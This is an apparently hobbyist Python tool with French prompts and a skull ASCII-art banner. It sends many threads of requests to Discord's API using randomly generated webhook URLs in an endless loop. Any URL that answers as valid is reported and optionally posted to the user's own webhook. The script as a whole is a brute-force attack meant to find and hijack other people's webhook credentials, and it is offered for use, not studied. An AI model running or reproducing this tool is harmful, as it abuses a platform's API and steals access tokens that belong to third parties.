import string
import requests
import json
import random
import threading
import sys

from colorama import Fore, Back, Style, init
import os

os.system('color 4')

menu = f"""
                                              @@@@                @%@@                                      
                                       @@@@@@@@@@@@               @@@@@@@@@@%                               
                                  @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@                          
                                 @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%                         
                                %@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@                        
                               @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@                       
                              @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@                      
                             @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@                     
                            @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%                    
                           @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@                   
                          %@@@@@@@@@@@@@@@@@@    @@@@@@@@@@@@@@@@@@    @@@@@@@@@@@@@@@@@@%                  
                          %@@@@@@@@@@@@@@@@        %@@@@@@@@@@@%@        @@@@@@@@@@@@@@@@@                  
                          %@@@@@@@@@@@@@@@          @@@@@@@@@@@@          @@@@@@@@@@@@@@@%                  
                         %@@@@@@@@@@@@@@@@          @@@@@@@@@@@%          %@@@@@@@@@@@@@@@@                 
                         @@@@@@@@@@@@@@@@@%         @@@@@@@@@@@%         %@@@@@@@@@@@@@@@@@                 
                         @@@@@@@@@@@@@@@@@@@      %@@@@@@@@@@@@@@@      @@@@@@@@@@@@@@@@@@%                 
                         %@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%                 
                         @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%                 
                         @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@                 
                         @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%                 
                           @%@@@@@@@@@@@@@%@@   @@@@%@@@@@@@@@%%%@%@@  @@@@@@@@@@@@@@@@@@                   
                              @@%@@@@@@@@@@@@@                        @%@@@@@@@@@@@%@@                      
                                   @%@@@@@@@                            @@@@@@%%@                           
                                         @@                              @@    
                                              
                                               ╔════════════════════╗
                                               ║ Webhook Genérateur ║
                                               ╚════════════════════╝     
"""

print(menu)

def verifier_webhook(webhook_url):
    return webhook_url.startswith("https://discord.com/api/webhooks/")

def envoyer_webhook(webhook_url, contenu_embed):
    if webhook_url:
        payload = {
            'embeds': [contenu_embed]
        }

        headers = {
            'Content-Type': 'application/json'
        }

        requests.post(webhook_url, data=json.dumps(payload), headers=headers)

def generer_et_verifier_webhook(webhook_url=None):
    premier = ''.join([str(random.randint(0, 9)) for _ in range(19)])
    second = ''.join(random.choice(string.ascii_letters + string.digits + '-' + '_') for _ in range(random.choice([68])))
    webhook_test_url = f"https://discord.com/api/webhooks/{premier}/{second}"

    try:
        response = requests.head(webhook_test_url)
        status = "Valide" if response.status_code == 200 else "Invalide"

        if status == "Invalide":
            sys.stdout.write(f"\rWebhook Invalide : {webhook_test_url}  ")
            sys.stdout.flush()
        else:
            print(f"Webhook {status} : {webhook_test_url}")

        if status == "Valide" and webhook_url:
            contenu_embed = {
                'title': 'Webhook Valide !',
                'description': f"**Webhook :**\n```{webhook_test_url}```"
            }
            envoyer_webhook(webhook_url, contenu_embed)

    except Exception as e:
        print(f"Erreur avec le Webhook : {webhook_test_url} | Détails : {e}")

def lancer_threads(threads_number, webhook_url=None):
    threads = []

    try:
        for _ in range(threads_number):
            t = threading.Thread(target=lambda: generer_et_verifier_webhook(webhook_url))
            t.start()
            threads.append(t)

        for thread in threads:
            thread.join()
    except Exception as e:
        print(f"Erreur lors du lancement des threads : {e}")

def main():
    try:
        utiliser_webhook = input("Voulez-vous utiliser un Webhook ? (y/n) : ")
        webhook_url = None

        if utiliser_webhook.lower() in ['y', 'yes']:
            webhook_url = input("Entrez l'URL du Webhook : ")
            if not verifier_webhook(webhook_url):
                print("URL du Webhook invalide.")
                return

        threads_number = int(input("Nombre de threads à lancer : "))

        while True:
            lancer_threads(threads_number, webhook_url)
    except Exception as e:
        print(f"Une erreur est survenue : {e}")

if __name__ == "__main__":
    main()
